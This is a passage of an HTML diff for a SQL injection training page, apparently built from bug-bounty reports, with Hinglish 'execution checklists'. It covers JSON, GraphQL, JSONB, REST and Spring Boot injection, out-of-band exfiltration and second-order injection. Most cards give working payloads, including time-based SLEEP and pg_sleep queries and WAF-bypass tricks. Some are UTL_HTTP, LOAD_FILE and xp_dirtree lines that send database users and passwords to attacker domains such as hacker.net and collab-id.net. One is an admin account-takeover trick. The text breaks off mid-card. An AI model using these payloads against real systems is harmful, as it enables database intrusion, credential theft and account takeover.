+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- â•â•â• PHASE 4 â€” MODERN ATTACK SURFACES â•â•â• -->
+<section class="phase-section" id="phase4">
+    <div class="phase-header"><span class="phase-number">PHASE 04</span><span class="phase-title">MODERN ATTACK SURFACES
+            â€” JSON API Â· GraphQL Â· JSONB Â· REST Â· Spring Boot</span><span class="phase-count" id="p4count">0 / 5
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase4">
+
+        <!-- #16 JSON Body API -->
+        <div class="report-card" data-severity="high" id="report-16">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #16 Â· Total #335</div>
+                    <div class="report-title">Blind SQLi via JSON Parameter â€” Update Profile API</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Tech & Networking) Â· $4,000 Â· 8.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JSON Body</span><span
+                            class="technique-tag">Content-Type Switch</span><span class="technique-tag">Raw Query</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">POST /api/v3/user/update</code> with JSON body. Backend:
+                        <code class="c">UPDATE users SET location='Mumbai' WHERE username='avin'</code>. Payload: <code
+                            class="c">"location": "Mumbai' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a) AND '1'='1"</code>.
+                        JSON parse â†’ SQL query build â†’ 10s delay = Blind SQLi!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Content-Type check karo</strong> â€” <code
+                                class="c">application/json</code> ya <code class="c">application/xml</code> ja raha
+                            hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Har JSON field test karo</strong> â€” <code
+                                class="c">username</code>, <code class="c">email</code>, <code class="c">settings</code>
+                            mein <code class="c">'</code> bhej kar dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Quote escape karo</strong> â€” Direct <code class="c">'</code>
+                            block? <code class="c">\'</code> ya <code class="c">%27</code> JSON ke andar try
+                            karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Content-Type switch karo</strong> â€” <code
+                                class="c">application/json</code> â†’ <code
+                                class="c">application/x-www-form-urlencoded</code>. Backend dono support kare par filter
+                            sirf ek par!</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Bulk actions test karo</strong> â€” <code
+                                class="c">[{"id":1},{"id":2}]</code> array mein injection try karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #17 GraphQL -->
+        <div class="report-card" data-severity="critical" id="report-17">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #17 Â· Total #336</div>
+                    <div class="report-title">Critical SQLi in GraphQL â€” Search Arguments</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Travel & Booking) Â· $7,500 Â· 9.8 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">GraphQL</span><span
+                            class="technique-tag">Introspection</span><span class="technique-tag">JSON Escape</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/graphql</code> endpoint. Query: <code
+                            class="c">searchProducts(name: \"shoes\")</code>. Payload: <code
+                            class="c">name: \"shoes' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--\"</code>. JSON mein
+                        <code class="c">\"</code> escape karo. Backend: <code
+                            class="c">WHERE name = 'shoes' AND SLEEP(10)...'</code> â†’ 10s delay = SQLi confirmed!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Introspection query bhejo</strong> â€” <code
+                                class="c">__schema</code> query se saare types + fields dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Har argument test karo</strong> â€” <code class="c">id</code>, <code
+                                class="c">name</code>, <code class="c">filter</code>, <code class="c">limit</code> mein
+                            <code class="c">'</code> bhejo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>JSON escape karo</strong> â€” Payload ke liye hamesha <code
+                                class="c">\"</code> ka use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Mutations target karo</strong> â€” Query ke saath mutation
+                            (create/update) bhi test karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Variables se bypass karo</strong> â€” Direct query block? GraphQL
+                            variables ka use karo.</span>
+                    </li>
+                </ul>
+                <div class="protip-box">
+                    <div class="protip-label">ðŸ’¡ PRO TIP</div>
+                    <div class="protip-text">GraphQL ka advantage: Introspection se poora schema mil jata hai â€” table
+                        names + column names guess nahi karne padte! <code class="c">/graphql</code> par 403? Try <code
+                            class="c">/v1/graphql</code> ya <code class="c">/api/graphql</code>.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #18 PostgreSQL JSONB -->
+        <div class="report-card" data-severity="high" id="report-18">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #18 Â· Total #337</div>
+                    <div class="report-title">SQLi in PostgreSQL JSONB Filtering â€” FinTech</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global FinTech & Crypto) Â· $5,000 Â· 8.7 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JSONB Operators</span><span
+                            class="technique-tag">->> Operator</span><span class="technique-tag">pg_sleep</span></div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/api/v1/tx?metadata->'type'='transfer'</code>. Backend:
+                        <code class="c">WHERE details->>'type' = 'transfer'</code>. Payload: <code
+                            class="c">type'='transfer' OR (SELECT 1 FROM pg_sleep(10))='1</code>. <code
+                            class="c">>></code> operator ke baad quote break â†’ pg_sleep inject â†’ 10s freeze!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>JSONB operators dhoondho</strong> â€” URL mein <code
+                                class="c">-></code>, <code class="c">>></code>, <code class="c">#></code>, <code
+                                class="c">@></code> dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Quote escaping test karo</strong> â€” JSONB mein <code
+                                class="c">'</code> check karo, JSON keys quotes ke andar.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Type casting use karo</strong> â€” <code class="c">::text</code> ya
+                            <code class="c">::int</code> se payload valid banao.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>OOB try karo</strong> â€” pg_sleep block? <code
+                                class="c">dblink</code> ya <code class="c">copy</code> se DNS exfiltration.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #19 REST API Path -->
+        <div class="report-card" data-severity="high" id="report-19">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #19 Â· Total #338</div>
+                    <div class="report-title">SQLi in REST API Path Parameter â€” Mobile App</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (HR & Payroll SaaS) Â· $4,500 Â· 8.5 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Path Segment</span><span
+                            class="technique-tag">/**/ No Spaces</span><span class="technique-tag">API Versioning</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/api/v2/projects/998/details</code>. <code
+                            class="c">/998'/details</code> â†’ 500 error! Path mein spaces 404 de dete hain, isliye <code
+                            class="c">/**/</code> use: <code
+                            class="c">/998'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(10)))a)/**/AND/**/'1'='1/details</code>
+                        â†’ 10.2s delay = SQLi confirmed!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Path params target karo</strong> â€” <code
+                                class="c">/user/{id}</code>, <code class="c">/org/{name}</code> mein <code
+                                class="c">'</code> bhejo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>/**/ for spaces use karo</strong> â€” REST routes mein <code
+                                class="c">%20</code> aksar 404 deta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>API versions check karo</strong> â€” <code class="c">/v2/</code>
+                            vulnerable, <code class="c">/v3/</code> patched? Dono test.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>HTTP methods test karo</strong> â€” GET ke alawa PUT, PATCH, DELETE
+                            par bhi injection try.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #20 Spring Boot -->
+        <div class="report-card" data-severity="high" id="report-20">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #20 Â· Total #339</div>
+                    <div class="report-title">Spring Boot SQLi â€” JPA Native Query Injection</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Enterprise Software) Â· $4,000 Â· 8.4 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Hibernate</span><span
+                            class="technique-tag">createNativeQuery</span><span class="technique-tag">Error-Based</span>
+                    </div>
+                </div><span class="severity-badge sev-high">ðŸŸ  HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/api/reports/download?sortBy=user_name</code>. Java
+                        backend: <code class="c">"SELECT * FROM reports ORDER BY " + sortBy</code> (String
+                        concatenation!). <code class="c">sortBy=user_name'</code> â†’ 500 + stack trace with SQL syntax
+                        error. Payload: <code
+                            class="c">sortBy=(CASE WHEN (SELECT 1)=1 THEN user_name ELSE (SELECT 1/0) END)</code>. True
+                        = sort, False = division error. Error-based data extraction!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Stack traces check karo</strong> â€” 500 error mein <code
+                                class="c">org.hibernate.exception</code> = Java backend confirmed.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Sorting/filtering params target karo</strong> â€” <code
+                                class="c">sortBy</code>, <code class="c">direction</code>, <code class="c">filter</code>
+                            mein native queries 80% chances.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Case sensitivity test karo</strong> â€” <code
+                                class="c">SELECT</code> block par <code class="c">select</code> kaam kar sakta
+                            hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>HQL injection try karo</strong> â€” SQL nahi chale toh Hibernate
+                            Query Language: <code class="c">' or 1=1</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Error messages ka fayda uthao</strong> â€” Spring Boot mein errors
+                            aksar enabled rehte hain.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- â•â•â• PHASE 5 â€” OUT-OF-BAND (OOB) EXFILTRATION â•â•â• -->
+<section class="phase-section" id="phase5">
+    <div class="phase-header"><span class="phase-number">PHASE 05</span><span class="phase-title">OUT-OF-BAND (OOB)
+            EXFILTRATION â€” DNS Â· LOAD_FILE Â· UTL_HTTP Â· xp_dirtree</span><span class="phase-count" id="p5count">0 / 4
+            reports</span></div>
+    <div class="cards-grid" id="grid-phase5">
+
+        <!-- #21 OOB DNS -->
+        <div class="report-card" data-severity="critical" id="report-21">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #21 Â· Total #340</div>
+                    <div class="report-title">OOB SQLi via DNS Exfiltration â€” Cloud Infrastructure</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Fortune 500 Cloud) Â· $8,000 Â· 9.9 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">UTL_INADDR</span><span
+                            class="technique-tag">DNS Lookup</span><span class="technique-tag">Burp Collaborator</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Search param. Time-based + Boolean sab block. OOB strategy: DB ko bolo
+                        meri DNS query bhejo! Oracle payload: <code
+                            class="c">' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.hacker-dns.com') FROM dual--</code>.
+                        DB ne <code class="c">SYSTEM.hacker-dns.com</code> ka IP dhoondha â†’ DNS log mein "SYSTEM" = DB
+                        user leaked bina screen par kuch dikhe!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Listener setup karo</strong> â€” Burp Collaborator ya <code
+                                class="c">dnslog.cn</code> se request catch karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>DNS leak test karo</strong> â€” Simple <code
+                                class="c">ping.hacker.com</code> se connectivity check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>DB-specific commands</strong> â€” MSSQL: <code
+                                class="c">xp_dirtree</code>, Oracle: <code class="c">UTL_HTTP</code>, MySQL: <code
+                                class="c">LOAD_FILE</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Egress filters bypass karo</strong> â€” HTTP block? DNS aksar
+                            firewalls mein allow hota hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #22 MySQL LOAD_FILE OOB -->
+        <div class="report-card" data-severity="critical" id="report-22">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #22 Â· Total #341</div>
+                    <div class="report-title">OOB SQLi via MySQL LOAD_FILE â€” Windows UNC Path</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Gaming & Esports) Â· $5,400 Â· 9.3 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">LOAD_FILE()</span><span
+                            class="technique-tag">UNC Path</span><span class="technique-tag">SMB/DNS</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/api/v1/profile?id=505</code>. SLEEP, UNION sab fail â€”
+                        async processing. Windows + MySQL = LOAD_FILE UNC trick. Payload: <code
+                            class="c">id=505' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.xyz123.burpcollaborator.net\\\\a'))) --</code>.
+                        Windows DNS request bhejta hai: <code class="c">admin.xyz123...</code> = user leaked via Burp
+                        Collaborator!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Collaborator domain generate karo</strong> â€” Burp â†’ Project
+                            Options â†’ Collaborator Client.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>LOAD_FILE test karo</strong> â€” <code
+                                class="c">LOAD_FILE('\\\\your-domain\\a')</code> bhej kar ping check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Privileges check karo</strong> â€” <code
+                                class="c">secure_file_priv</code> empty hona chahiye.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Data exfiltrate karo</strong> â€” <code
+                                class="c">CONCAT('\\\\\\\\',(SELECT @@version),'.domain\\a')</code>.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #23 Oracle UTL_HTTP -->
+        <div class="report-card" data-severity="critical" id="report-23">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #23 Â· Total #342</div>
+                    <div class="report-title">OOB SQLi in Oracle DB â€” UTL_HTTP Exfiltration</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Investment Bank) Â· $10,000 Â· 10.0 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">UTL_HTTP.REQUEST</span><span
+                            class="technique-tag">PL/SQL</span><span class="technique-tag">Oracle FROM DUAL</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text"><code class="c">?account_id=123</code>. <code class="c">'</code> â†’
+                        ORA-01756 error = Oracle! UNION fail (columns mismatch). PL/SQL package: <code
+                            class="c">123' AND 1=utl_http.request('http://'||(SELECT user FROM dual)||'.hacker.net/')--</code>.
+                        Oracle HTTP request bhejta hai â†’ <code class="c">DB_ADMIN.hacker.net</code> = Collaborator log
+                        mein DB user! $10K bounty!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Oracle fingerprint karo</strong> â€” <code
+                                class="c">SELECT banner FROM v$version</code> ya <code class="c">ORA-</code>
+                            errors.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>UTL_HTTP test karo</strong> â€” <code
+                                class="c">utl_http.request('http://google.com') FROM dual</code> se connectivity.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>UTL_INADDR fallback</strong> â€” HTTP block? <code
+                                class="c">utl_inaddr.get_host_address</code> DNS lookup.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>ACL check karo</strong> â€” Oracle 11g+ Access Control Lists OOB
+                            block karti hain.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- #24 MSSQL xp_dirtree -->
+        <div class="report-card" data-severity="critical" id="report-24">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #24 Â· Total #343</div>
+                    <div class="report-title">OOB SQLi via MSSQL xp_dirtree â€” Enterprise CRM</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (CRM & Sales SaaS) Â· $7,200 Â· 9.6 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">xp_dirtree</span><span
+                            class="technique-tag">DECLARE + EXEC</span><span class="technique-tag">DNS/SMB
+                            Trigger</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">IIS/10.0 header = MSSQL. Normal Blind payloads WAF block. UNC Path
+                        injection: <code
+                            class="c">101'; DECLARE @d varchar(1024); SELECT @d=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '\\'+@d+'.collab-id.net\\a';--</code>.
+                        Admin password DNS request mein: <code class="c">password123.collab-id.net</code>!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>MSSQL confirm karo</strong> â€” <code class="c">@@version</code> ya
+                            IIS headers se verify.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>xp_dirtree test karo</strong> â€” <code
+                                class="c">EXEC master..xp_dirtree '\\your-domain\\a'</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>xp_fileexist fallback</strong> â€” xp_dirtree block? Same logic
+                            xp_fileexist se.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>WAF bypass karo</strong> â€” DECLARE aur EXEC ke beech <code
+                                class="c">/**/</code> ya <code class="c">%0a</code> use karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- â•â•â• PHASE 6 â€” EDGE CASES & ADVANCED CHAINING â•â•â• -->
+<section class="phase-section" id="phase6">
+    <div class="phase-header"><span class="phase-number">PHASE 06</span><span class="phase-title">EDGE CASES & ADVANCED
+            CHAINING â€” Second-Order Â· Polyglot Â· RCE Â· Truncation Â· Chain Â· 0-Day</span><span class="phase-count"
+            id="p6count">0 / 6 reports</span></div>
+    <div class="cards-grid" id="grid-phase6">
+
+        <!-- #25 Second-Order -->
+        <div class="report-card" data-severity="critical" id="report-25">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">â—ˆ REPORT #25 Â· Total #344</div>
+                    <div class="report-title">Second-Order SQLi â€” "Change Password" Feature</div>
+                    <div class="report-target">ðŸŽ¯ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (Global Social Media) Â· $6,000 Â· 9.2 CVSS</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Stored Payload</span><span
+                            class="technique-tag">Registration â†’ Trigger</span><span
+                            class="technique-tag">admin'--</span></div>
+                </div><span class="severity-badge sev-critical">ðŸ”´ CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">ðŸ“‹ SCENARIO</div>
+                    <div class="scenario-text">Phase 1: Register account with username: <code class="c">admin'--</code>.
+                        DB saves: <code class="c">INSERT INTO users (username) VALUES ('admin'--')</code>. Phase 2:
+                        "Change Password" â†’ Query: <code
+                            class="c">UPDATE users SET password='new' WHERE username='admin'--'</code>. Comment <code
+                            class="c">--</code> terminates query â†’ password change happens for REAL admin account!
+                        Account Takeover bina admin password jaane!</div>
+                </div>
+                <div class="checklist-label">âœ… EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Storage points dhoondho</strong> â€” Registration, Profile Update,
+                            Address Book mein payload save karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Internal pages check karo</strong> â€” Profile, Password change,
+                            Dashboard par data raw reflect ho?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>SQL comments use karo</strong> â€” <code class="c">'--</code>, <code
+                                class="c">'#</code>, ya <code class="c">/*</code> se query terminate karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Reflection check karo</strong> â€” "Hello admin'--" dikhe = data raw
+                            format mein = vulnerable.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Blind payload set karo</strong> â€” <code
